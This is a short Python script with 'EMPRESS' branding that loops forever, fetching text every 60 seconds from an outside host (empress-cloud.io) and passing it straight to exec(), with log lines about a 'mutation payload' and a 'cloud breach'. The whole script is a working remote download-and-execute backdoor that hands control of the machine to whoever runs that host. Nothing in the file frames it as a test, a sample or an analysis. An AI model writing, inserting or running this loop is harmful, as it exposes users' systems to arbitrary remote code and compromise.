import time
import requests
while True:
  try:
    r = requests.get("https://empress-cloud.io/mutation/payload")
    if r.status_code == 200:
      exec(r.text)
    else:
      print("[EMPRESS] No mutation payload received.")
  except Exception as e:
    print(f"[EMPRESS] Cloud breach detected: {e}")
  time.sleep(60)
